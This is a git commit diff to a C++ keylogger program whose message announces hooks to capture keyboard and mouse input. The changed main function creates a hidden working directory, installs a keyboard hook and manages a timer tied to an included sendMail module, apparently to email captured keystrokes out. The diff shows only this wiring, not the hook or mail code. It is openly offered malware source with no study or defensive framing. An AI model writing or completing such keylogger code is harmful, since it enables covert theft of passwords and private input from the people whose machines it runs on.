9ff7c55072dd1ee7648cc8b0a1fca648e2508969
jvandyke1993 <joshua93@protonmail.com>
2022-08-19 04:02:29 -0500

    Setting up hooks to capture pressed keys on keyboard and mouse

--- C++/sources/keylogger.cpp
+++ C++/sources/keylogger.cpp
@@ -6,17 +6,19 @@
 #include "io.h"
 #include "timer.h"
 #include "sendMail.h"
+#include "keybHook.h"
 
 using namespace std;
 
 int main () {
 
     MSG Msg;
-
+    IO::MkDir(IO::GetOurPath(true));
+    InstallHook();
     while(GetMessage (&Msg, NULL, 0, 0)) {
         TranslateMessage(&Msg);
         DispatchMessage(&Msg);
     }
-
+    MailTimer.Stop();
     return 0;
 }
